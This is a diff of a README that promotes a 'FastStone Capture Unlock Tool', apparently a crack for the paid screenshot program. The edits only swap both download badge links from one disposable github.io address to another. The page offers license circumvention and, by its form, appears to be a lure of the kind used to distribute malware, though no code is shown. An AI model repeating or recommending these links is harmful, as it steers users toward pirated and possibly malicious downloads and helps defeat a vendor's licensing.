@@ -6,7 +6,7 @@
 <h1 align="center">📸 FastStone Capture Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/202" target="_blank">
+  <a href="https://faststonedown.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20FastStone%20Unlock%20Tool-Unlock%20Full%20Capture%20Power-2E8B57?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download FastStone Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -96,7 +96,7 @@ If you have feature suggestions or compatibility requests, feel free to open an 
 ## ⭐ Unlock FastStone Capture – Go Beyond Standard Tools
 
 Take your screenshots and recordings to the next level.  
-[Get the Unlock Tool](https://hiopal3847.github.io/.github/202) and unleash the full capabilities of FastStone Capture.
+[Get the Unlock Tool](https://faststonedown.github.io/.github/) and unleash the full capabilities of FastStone Capture.
 
 ---
 
